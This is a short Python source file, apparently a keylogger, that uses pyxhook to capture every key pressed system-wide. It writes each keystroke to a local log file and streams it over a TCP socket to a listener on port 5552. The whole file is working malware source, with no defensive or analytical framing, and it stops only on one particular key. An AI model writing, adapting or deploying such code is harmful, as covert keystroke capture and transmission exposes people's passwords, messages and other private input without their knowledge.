import pyxhook
import socket
import threading
import socketserver
log_file='./file.log'
def OnKeyPress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('\n')
  print(event.Ascii)
  socket1.sendall((event.Key).encode())
  if event.Ascii==39 :
    fob.close()
    new_hook.cancel()
socket1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket1.connect(("localhost", 5552))
new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
new_hook.HookKeyboard()
new_hook.start()